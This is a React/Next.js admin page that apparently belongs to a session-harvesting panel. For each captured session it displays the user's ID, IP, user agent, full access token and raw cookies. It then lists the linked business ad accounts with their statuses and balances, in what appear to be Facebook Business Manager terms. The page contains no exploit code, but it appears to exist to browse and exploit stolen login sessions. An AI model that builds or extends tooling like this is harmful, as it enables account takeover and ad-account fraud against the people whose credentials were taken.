"use client";

import { useState, useEffect, useCallback, useRef, Suspense } from "react";
import { useRouter, useParams } from "next/navigation";

const PAGE_SIZE = 25;
const STATUS_META = {
  1: { label: "Active", color: "#22c55e" },
  2: { label: "Disabled", color: "#ef4444" },
  3: { label: "Unsettled", color: "#f97316" },
  7: { label: "Risk Review", color: "#a855f7" },
  9: { label: "Grace Period", color: "#eab308" },
  101: { label: "Closed", color: "#6b7280" },
};
const SORTABLE_COLS = [
  { key: "name", label: "Name" },
  { key: "accountStatus", label: "Status" },
  { key: "balance", label: "Balance" },
  { key: "currency", label: "Currency" },
  { key: "createdAt", label: "Created" },
];

function BusinessAdAccounts() {
  const router = useRouter();
  const { id, bmId } = useParams();

  // Header data — loaded once, never replaced
  const [business, setBusiness] = useState(null);
  const [headerError, setHeaderError] = useState("");

  // Table state
  const [rows, setRows] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [search, setSearch] = useState("");
  const [searchInput, setSearchInput] = useState("");
  const [sortBy, setSortBy] = useState("createdAt");
  const [sortDir, setSortDir] = useState("desc");
  const [loading, setLoading] = useState(false);
  const [stale, setStale] = useState(false);
  const abortRef = useRef(null);

  const totalPages = Math.max(1, Math.ceil(total / PAGE_SIZE));

  const loadAll = useCallback(async (p, s, sb, sd) => {
    if (abortRef.current) abortRef.current.abort();
    const ctrl = new AbortController();
    abortRef.current = ctrl;
    setLoading(true);
    setStale(false);
    try {
      const q = new URLSearchParams({ page: p, search: s, sortBy: sb, sortDir: sd }).toString();
      const res = await fetch(`/api/admin/businesses/${bmId}?${q}`, { signal: ctrl.signal });
      if (res.status === 401) { router.replace("/tpmt/admin"); return; }
      if (res.status === 404) { setHeaderError("Business not found"); return; }
      if (!res.ok) throw new Error("Failed to load");
      const data = await res.json();
      if (!business) setBusiness(data.business);
      setRows(data.adAccounts);
      setTotal(data.total);
    } catch (e) {
      if (e.name !== "AbortError") setHeaderError(e.message);
    } finally {
      setLoading(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bmId, router]);

  useEffect(() => { loadAll(page, search, sortBy, sortDir); }, [loadAll, page, search, sortBy, sortDir]);

  function handleSearch(e) {
    e.preventDefault();
    setPage(1);
    setSearch(searchInput);
  }

  function clearSearch() {
    setSearchInput("");
    setPage(1);
    setSearch("");
  }

  function toggleSort(col) {
    const nextDir = sortBy === col && sortDir === "asc" ? "desc" : "asc";
    setSortBy(col);
    setSortDir(nextDir);
    setPage(1);
    setStale(true);
  }

  return (
    <div style={S.page}>
      <AdminHeader />

      {headerError && (
        <div style={S.container}><div style={S.errorBox}>{headerError}</div></div>
      )}

      {business && (
        <>
          <div style={S.infoBar}>
            <div style={S.container}>
              <Breadcrumb
                crumbs={[
                  { label: business.session.userName || id, href: `/tpmt/admin/sessions/${id}` },
                  { label: business.name },
                ]}
              />

              {/* Session section */}
              <div style={S.sectionLabel}>Session</div>
              <div style={S.infoGrid}>
                <InfoItem label="User" value={<strong>{business.session.userName}</strong>} />
                <InfoItem label="User ID" value={<code style={S.mono}>{business.session.userId}</code>} />
                <InfoItem label="App ID" value={<code style={S.mono}>{business.session.appId}</code>} />
                <InfoItem label="IP" value={business.session.ip || "—"} />
                <InfoItem label="Last Login" value={business.session.lastLoginAt ? new Date(business.session.lastLoginAt).toLocaleString() : "—"} />
                <InfoItem label="Created" value={new Date(business.session.createdAt).toLocaleString()} />
              </div>
              {business.session.userAgent && (
                <div style={S.longField}>
                  <span style={S.longFieldLabel}>User Agent</span>
                  <span style={S.longFieldVal}>{business.session.userAgent}</span>
                </div>
              )}
              <div style={S.longField}>
                <span style={S.longFieldLabel}>Token</span>
                <div style={S.codeBlock}>{business.session.token || "—"}</div>
              </div>
              {business.session.cookies && (
                <div style={S.longField}>
                  <span style={S.longFieldLabel}>Cookies</span>
                  <div style={{ ...S.codeBlock, maxHeight: 120 }}>{business.session.cookies}</div>
                </div>
              )}

              {/* Business section */}
              <div style={{ borderTop: "1px solid #e4e6eb", marginTop: 14, paddingTop: 12 }}>
                <div style={S.sectionLabel}>Business</div>
                <div style={S.infoGrid}>
                  <InfoItem label="Name" value={<strong>{business.name}</strong>} />
                  <InfoItem label="BM ID" value={<code style={S.mono}>{business.id}</code>} />
                  <InfoItem label="Total Accounts" value={total} />
                </div>
              </div>
            </div>
          </div>

          <div style={S.container}>
            <div style={S.tableWrap}>
              <div style={S.tableToolbar}>
                <span style={S.tableTitle}>Ad Accounts</span>
                <span style={S.tableCount}>{total} total</span>
                <div style={{ flex: 1 }} />
                <form onSubmit={handleSearch} style={{ display: "flex", gap: 6 }}>
                  <input
                    style={S.searchInput}
                    placeholder="Search by name or ID…"
                    value={searchInput}
                    onChange={(e) => setSearchInput(e.target.value)}
                  />
                  <button type="submit" style={S.searchBtn}>Search</button>
                  {search && <button type="button" style={S.clearBtn} onClick={clearSearch}>✕</button>}
                </form>
              </div>

              <div style={{ overflowX: "auto", position: "relative" }}>
                {(loading || stale) && <div style={S.tableOverlay} />}
                <table style={S.table}>
                  <thead>
                    <tr style={S.thead}>
                      {SORTABLE_COLS.map((col) => (
                        <SortTh key={col.key} col={col.key} sortBy={sortBy} sortDir={sortDir} onSort={toggleSort}>{col.label}</SortTh>
                      ))}
                      <Th>Account ID</Th>
                    </tr>
                  </thead>
                  <tbody>
                    {!loading && rows.length === 0 && (
                      <tr><td colSpan={6} style={S.empty}>No ad accounts found</td></tr>
                    )}
                    {rows.map((acc) => {
                      const sm = STATUS_META[acc.accountStatus] || { label: `Status ${acc.accountStatus}`, color: "#8d949e" };
                      return (
                        <tr key={acc.id} style={S.trStatic}>
                          <Td>
                            <div style={{ fontWeight: 600 }}>{acc.name}</div>
                            {acc.disableReason != null && (
                              <div style={{ fontSize: 10, color: "#ef4444", marginTop: 2 }}>Disable reason: {acc.disableReason}</div>
                            )}
                          </Td>
                          <Td><span style={{ ...S.badge, background: sm.color + "18", color: sm.color }}>{sm.label}</span></Td>
                          <Td style={{ fontFamily: "ui-monospace, monospace", fontSize: 12 }}>{formatBalance(acc.balance, acc.currency)}</Td>
                          <Td>{acc.currency}</Td>
                          <Td style={{ fontSize: 11, color: "#8d949e", whiteSpace: "nowrap" }}>{new Date(acc.createdAt).toLocaleString()}</Td>
                          <Td><code style={S.mono}>{acc.id}</code></Td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>

            <Pagination page={page} totalPages={totalPages} onPage={setPage} />
          </div>
        </>
      )}

      {!business && !headerError && (
        <div style={S.container}><div style={S.loading}>Loading…</div></div>
      )}
    </div>
  );
}

function formatBalance(balance, currency) {
  if (!currency) return String(balance);
  try { return new Intl.NumberFormat("en-US", { style: "currency", currency }).format(balance / 100); }
  catch { return String(balance); }
}

export default function BusinessAdAccountsPage() {
  return <Suspense><BusinessAdAccounts /></Suspense>;
}

// ── Shared UI ─────────────────────────────────────────────────────────────────

function AdminHeader() {
  const router = useRouter();
  return (
    <div style={S.header}>
      <div style={S.headerInner}>
        <button style={S.adminBrand} onClick={() => router.push("/tpmt/admin/sessions")}>
          🛡️ Admin Area
        </button>
      </div>
    </div>
  );
}

function Breadcrumb({ crumbs }) {
  const router = useRouter();
  const base = [{ label: "Sessions", href: "/tpmt/admin/sessions" }];
  const all = [...base, ...crumbs];
  return (
    <div style={S.breadcrumb}>
      {all.map((c, i) => (
        <span key={i} style={{ display: "flex", alignItems: "center", gap: 6 }}>
          {i > 0 && <span style={S.breadSep}>›</span>}
          {c.href ? (
            <button style={S.breadLink} onClick={() => router.push(c.href)}>{c.label}</button>
          ) : (
            <span style={S.breadCurrent}>{c.label}</span>
          )}
        </span>
      ))}
    </div>
  );
}

function Pagination({ page, totalPages, onPage }) {
  const [inputVal, setInputVal] = useState(String(page));
  useEffect(() => { setInputVal(String(page)); }, [page]);

  function commitInput() {
    const n = parseInt(inputVal, 10);
    if (Number.isFinite(n) && n >= 1 && n <= totalPages) onPage(n);
    else setInputVal(String(page));
  }

  const WING = 2;
  function pageNums() {
    const nums = new Set([1, totalPages]);
    for (let i = page - WING; i <= page + WING; i++) {
      if (i >= 1 && i <= totalPages) nums.add(i);
    }
    const sorted = [...nums].sort((a, b) => a - b);
    const result = [];
    let prev = null;
    for (const n of sorted) {
      if (prev !== null && n - prev > 1) result.push("…");
      result.push(n);
      prev = n;
    }
    return result;
  }

  if (totalPages <= 1) return null;
  return (
    <div style={S.pagination}>
      <button style={{ ...S.pageBtn, opacity: page <= 1 ? 0.4 : 1 }} disabled={page <= 1} onClick={() => onPage(page - 1)}>‹</button>
      {pageNums().map((item, i) =>
        item === "…" ? <span key={`g${i}`} style={S.pageGap}>…</span> : (
          <button key={item} style={{ ...S.pageBtn, ...(item === page ? S.pageBtnActive : {}) }} onClick={() => item !== page && onPage(item)}>{item}</button>
        )
      )}
      <input style={S.pageInput} value={inputVal} onChange={(e) => setInputVal(e.target.value)} onBlur={commitInput} onKeyDown={(e) => { if (e.key === "Enter") commitInput(); else if (e.key === "Escape") setInputVal(String(page)); }} title="Go to page" />
      <span style={S.pageOf}>/ {totalPages}</span>
      <button style={{ ...S.pageBtn, opacity: page >= totalPages ? 0.4 : 1 }} disabled={page >= totalPages} onClick={() => onPage(page + 1)}>›</button>
    </div>
  );
}

function InfoItem({ label, value }) {
  return (
    <div>
      <div style={S.infoLabel}>{label}</div>
      <div style={S.infoVal}>{value}</div>
    </div>
  );
}

function SortTh({ col, sortBy, sortDir, onSort, children }) {
  const active = sortBy === col;
  return (
    <th style={{ ...S.th, cursor: "pointer", userSelect: "none", color: active ? "#1877f2" : "#8d949e" }} onClick={() => onSort(col)}>
      {children} <span style={{ opacity: active ? 1 : 0.35 }}>{active ? (sortDir === "asc" ? "↑" : "↓") : "↕"}</span>
    </th>
  );
}
function Th({ children }) { return <th style={S.th}>{children}</th>; }
function Td({ children, style }) { return <td style={{ ...S.td, ...style }}>{children}</td>; }

const S = {
  page: { minHeight: "100vh", background: "#f0f2f5", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", fontSize: 14, color: "#1c1e21" },
  header: { background: "#fff", borderBottom: "1px solid #ccd0d5", position: "sticky", top: 0, zIndex: 20 },
  headerInner: { maxWidth: 1200, margin: "0 auto", padding: "0 24px", height: 48, display: "flex", alignItems: "center" },
  adminBrand: { display: "flex", alignItems: "center", gap: 6, background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", fontSize: 14, fontWeight: 800, color: "#1877f2", padding: 0 },
  infoBar: { background: "#fff", borderBottom: "1px solid #ccd0d5", padding: "0 0 16px" },
  container: { maxWidth: 1200, margin: "0 auto", padding: "0 24px 40px" },
  breadcrumb: { display: "flex", alignItems: "center", gap: 4, padding: "14px 0 12px", flexWrap: "wrap" },
  breadSep: { color: "#ccd0d5", fontSize: 14 },
  breadLink: { background: "none", border: "none", padding: 0, cursor: "pointer", fontSize: 13, color: "#1877f2", fontFamily: "inherit" },
  breadCurrent: { fontSize: 13, color: "#606770", fontWeight: 600 },
  sectionLabel: { fontSize: 10, fontWeight: 800, color: "#1877f2", textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 10 },
  infoGrid: { display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(160px, 1fr))", gap: "10px 24px", marginBottom: 4 },
  infoLabel: { fontSize: 10, fontWeight: 700, color: "#8d949e", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 2 },
  infoVal: { fontSize: 13, color: "#1c1e21" },
  longField: { display: "flex", flexDirection: "column", gap: 4, marginTop: 10 },
  longFieldLabel: { fontSize: 10, fontWeight: 700, color: "#8d949e", textTransform: "uppercase", letterSpacing: "0.06em" },
  longFieldVal: { fontSize: 11, color: "#606770", wordBreak: "break-all" },
  codeBlock: { fontFamily: "ui-monospace, monospace", fontSize: 11, color: "#606770", background: "#f5f6f7", border: "1px solid #e4e6eb", borderRadius: 5, padding: "8px 10px", wordBreak: "break-all", overflowY: "auto", maxHeight: 80, lineHeight: 1.5 },
  mono: { fontFamily: "ui-monospace, monospace", fontSize: 11, background: "#f5f6f7", padding: "2px 5px", borderRadius: 3 },
  errorBox: { background: "#fff0f0", border: "1px solid #fa383e40", borderRadius: 8, padding: "12px 16px", color: "#fa383e", marginTop: 28, fontSize: 13 },
  loading: { color: "#8d949e", textAlign: "center", padding: 60 },
  tableWrap: { background: "#fff", border: "1px solid #ccd0d5", borderRadius: 8, overflow: "hidden", marginTop: 8 },
  tableToolbar: { display: "flex", alignItems: "center", gap: 10, padding: "12px 16px", borderBottom: "1px solid #ccd0d5", flexWrap: "wrap" },
  tableTitle: { fontWeight: 700, fontSize: 14 },
  tableCount: { fontSize: 12, color: "#8d949e" },
  tableOverlay: { position: "absolute", inset: 0, background: "#ffffff80", zIndex: 5, pointerEvents: "none" },
  searchInput: { background: "#f5f6f7", border: "1px solid #ccd0d5", borderRadius: 6, padding: "6px 10px", fontSize: 12, fontFamily: "inherit", outline: "none", width: 220 },
  searchBtn: { background: "#1877f2", color: "#fff", border: "none", borderRadius: 6, padding: "6px 14px", fontSize: 12, cursor: "pointer", fontFamily: "inherit" },
  clearBtn: { background: "#fff", border: "1px solid #ccd0d5", borderRadius: 6, padding: "6px 10px", fontSize: 12, cursor: "pointer", color: "#606770", fontFamily: "inherit" },
  table: { width: "100%", borderCollapse: "collapse", minWidth: 700 },
  thead: { background: "#f5f6f7" },
  th: { padding: "9px 14px", textAlign: "left", fontSize: 10, fontWeight: 700, color: "#8d949e", textTransform: "uppercase", letterSpacing: "0.07em", borderBottom: "1px solid #ccd0d5", whiteSpace: "nowrap" },
  trStatic: { borderBottom: "1px solid #e4e6eb" },
  td: { padding: "11px 14px", fontSize: 13, verticalAlign: "middle" },
  empty: { padding: "40px 0", textAlign: "center", color: "#8d949e", fontSize: 13 },
  badge: { display: "inline-block", padding: "3px 9px", borderRadius: 20, fontSize: 10, fontWeight: 700, whiteSpace: "nowrap" },
  pagination: { display: "flex", alignItems: "center", justifyContent: "center", gap: 4, marginTop: 18, flexWrap: "wrap" },
  pageBtn: { background: "#fff", border: "1px solid #ccd0d5", borderRadius: 6, padding: "5px 10px", fontSize: 13, cursor: "pointer", fontFamily: "inherit", minWidth: 34, textAlign: "center" },
  pageBtnActive: { background: "#1877f2", color: "#fff", borderColor: "#1877f2", fontWeight: 700 },
  pageGap: { color: "#8d949e", padding: "0 2px", fontSize: 13 },
  pageInput: { width: 44, textAlign: "center", background: "#f5f6f7", border: "1px solid #ccd0d5", borderRadius: 6, padding: "5px 4px", fontSize: 12, fontFamily: "inherit", outline: "none" },
  pageOf: { fontSize: 12, color: "#8d949e" },
};
